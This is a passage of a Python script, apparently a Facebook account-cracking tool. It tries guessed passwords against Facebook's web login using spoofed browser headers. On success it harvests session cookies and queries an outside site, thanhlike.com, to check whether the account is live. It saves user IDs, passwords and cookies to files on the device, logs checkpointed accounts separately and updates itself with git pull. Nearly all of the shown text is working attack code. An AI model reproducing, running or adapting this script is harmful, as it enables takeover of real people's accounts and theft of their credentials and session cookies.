E7oWOTfrWV7dLISiZb-xr6KHzt6JQ1MDi1EdaJJBN9ruKkabCBFS8izVNDZO57TAxAFtJ2eMw5Ly-7TrptyrMOvYtpchrgXfCwNTANo5RVGdkckbtMdK0gsE1AKV',
    'encpass': f"#PWD_BROWSER:0:{str(kontol()).split('.')[0]}:{pw}"}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			head = {
    'authority': 'web.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'datr=aA6mZ5W--xxtNdZOvLrqqtk4; sb=aA6mZyD5-WQ8_n3qPlZtiLot; ps_l=1; ps_n=1; locale=en_US; vpd=v1%3B858x432x2.125537157058716; wl_cbv=v2%3Bclient_version%3A2736%3Btimestamp%3A1739000557; m_pixel_ratio=2.125537157058716; dpr=2.3369150161743164; fr=0w9DKWZX1IuXOcrys.AWWTSq2GOTsN50dGdBeINCDAoLYr_RkW683pbQ.Bnpg5o..AAA.0.0.BnpxMV.AWWiZt45ktU; wd=1049x1174',
    'dpr': '2.5',
    'origin': 'https://web.facebook.com',
    'referer': 'https://web.facebook.com/index.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Foidc%252Ffacebook%252Fresponse%252F%26response_type%3Dcode%26scope%3Dopenid%2Blinking%26state%3DATCNkUfmV7-kT0H_apZVQlcFn--3sOg0SHirNncdQpz_WkKOIzO0MitlZMTdJMx04EjwGB1EcZMj-Ms_aF9WhhECscITcHQAux07FUFFSA6nrJ0POAczo16FEuBJ4f5MuzrEiYVMa-eazzu2jRHr4TfEg_h3Ghwbjh-GV5Fq66BS9741wVg9qq6jWWHwisx8SGI6cJXHwL4htDXoFrROQ6ji1y0HIQCNG9X4T1vQ9wzcjRfxVy8LcZJDMJ9sXmtjKTccIxtUS2e67Uxv4Gc1FR6vf-IbNlXJP_mcaXf-WZQP3WLB0WFbhdDUA4gUNZujDP-a59qmdnjEzBLVp7Qg7m_p9mziUqWUHJilUBCYbZZ_Sh0IT2_UIolI_TSiaJSLMOHTSiPMNRNgVJayYDwa2hNFZ_WwRtaaflhrBPruk8U4e4wwBQwIyVB0YVPxNnEWidoF2Oe7Vy8xHBCu6w4F4iLL_I-iILVQVBFltUji6w3xMOu8SpvDu6AAwo82ISZIlEGPmFZ0Xzx6MWzgvo_papReuXQV2zRpdPFWAZXJDg6F0EyObRerYq6a4DDD2oNomkbgCHZtXVy5pU9om7AeZFag5SfXc2soPlND2ZWfV0pghVP71QRrIvyKi5UaYDV0VFtbGBpp29d2BetNsdbW807xPY5f5nw2Sg3NO4P6WioxTZVqii9wCsvirc8WzKB4tSg9AAo_jCd2-aIP42XD43hpAFebRN83QN7J34U_CyQLjAN-3Hd0wTIpAqobOWxGFSNy2VhDAGPa_5Kot2xKRx1vAmkgsoWqEwbiVWBLZwgog-CguHjOEva8zhWNQyykfV1RB81MytGj9z8KJlZxNflstuA6HkvXeufJPx-bP6dthJREdQGuhgBRk6ngR9cSAuIZLHkbfa0Y_UzfJYuRaZ-xjzD8PYDzJuNaK3VLuOOjZRcSNYkY9N42NdHwPe8JuCHASsQcc67r9YrbBgTEDDRd-hPsFzGJNlSD59nynsFgYHQamIgzL4d-r6zpMo6Hp52g4WXLO5sOkP2OOePY6iyGzTPM35qLHZScm-SSBFB4AdMIE7oWOTfrWV7dLISiZb-xr6KHzt6JQ1MDi1EdaJJBN9ruKkabCBFS8izVNDZO57TAxAFtJ2eMw5Ly-7TrptyrMOvYtpchrgXfCwNTANo5RVGdkckbtMdK0gsE1AKV&deoia=1&no_universal_links=1&_rdc=1&_rdr',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'viewport-width': '980'}
			mahin_back = ses.post("https://web.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM5MDAyNjQ1LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next=https%3A%2F%2Fweb.facebook.com%2Foidc%2F%3Fapp_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Foidc%252Ffacebook%252Fresponse%252F%26response_type%3Dcode%26scope%3Dopenid%2Blinking%26state%3DATCNkUfmV7-kT0H_apZVQlcFn--3sOg0SHirNncdQpz_WkKOIzO0MitlZMTdJMx04EjwGB1EcZMj-Ms_aF9WhhECscITcHQAux07FUFFSA6nrJ0POAczo16FEuBJ4f5MuzrEiYVMa-eazzu2jRHr4TfEg_h3Ghwbjh-GV5Fq66BS9741wVg9qq6jWWHwisx8SGI6cJXHwL4htDXoFrROQ6ji1y0HIQCNG9X4T1vQ9wzcjRfxVy8LcZJDMJ9sXmtjKTccIxtUS2e67Uxv4Gc1FR6vf-IbNlXJP_mcaXf-WZQP3WLB0WFbhdDUA4gUNZujDP-a59qmdnjEzBLVp7Qg7m_p9mziUqWUHJilUBCYbZZ_Sh0IT2_UIolI_TSiaJSLMOHTSiPMNRNgVJayYDwa2hNFZ_WwRtaaflhrBPruk8U4e4wwBQwIyVB0YVPxNnEWidoF2Oe7Vy8xHBCu6w4F4iLL_I-iILVQVBFltUji6w3xMOu8SpvDu6AAwo82ISZIlEGPmFZ0Xzx6MWzgvo_papReuXQV2zRpdPFWAZXJDg6F0EyObRerYq6a4DDD2oNomkbgCHZtXVy5pU9om7AeZFag5SfXc2soPlND2ZWfV0pghVP71QRrIvyKi5UaYDV0VFtbGBpp29d2BetNsdbW807xPY5f5nw2Sg3NO4P6WioxTZVqii9wCsvirc8WzKB4tSg9AAo_jCd2-aIP42XD43hpAFebRN83QN7J34U_CyQLjAN-3Hd0wTIpAqobOWxGFSNy2VhDAGPa_5Kot2xKRx1vAmkgsoWqEwbiVWBLZwgog-CguHjOEva8zhWNQyykfV1RB81MytGj9z8KJlZxNflstuA6HkvXeufJPx-bP6dthJREdQGuhgBRk6ngR9cSAuIZLHkbfa0Y_UzfJYuRaZ-xjzD8PYDzJuNaK3VLuOOjZRcSNYkY9N42NdHwPe8JuCHASsQcc67r9YrbBgTEDDRd-hPsFzGJNlSD59nynsFgYHQamIgzL4d-r6zpMo6Hp52g4WXLO5sOkP2OOePY6iyGzTPM35qLHZScm-SSBFB4AdMIE7oWOTfrWV7dLISiZb-xr6KHzt6JQ1MDi1EdaJJBN9ruKkabCBFS8izVNDZO57TAxAFtJ2eMw5Ly-7TrptyrMOvYtpchrgXfCwNTANo5RVGdkckbtMdK0gsE1AKV",headers=head, data=date, cookies={'cookie': koki}, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				match = re.search(r'c_user=([^;]+)', kuki)
				idf = match.group(1) if match else None
				try:
					liveck= requests.get(f'https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={idf}').text
					if 'live' in liveck:
						print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{GREEN}{pw}{N}')
						if 'y' in cokix:
							print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
						if 'y' in apxx:
							application_check(ses,kuki)
						
						open('/sdcard/'+'KING-live-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
					elif 'die' in liveck:
						open('/sdcard/'+'KING-death-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
					else:
						open('/sdcard/'+'KING-Temp-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
				except:pass
				break			
			elif "checkpoint" in mahin_back.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				open('/sdcard/'+'KING-CP.txt','a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1
if __name__=='__main__':
	try:
		os.system('git pull')
		mht='XD'
		hack(mht)
	except requests.exceptions.ConnectionError:banner();print(f'{rgen}Check Your Internet..');exit()
	except:banner();print(f'{rgen}Hello Brother something wrong');exit()
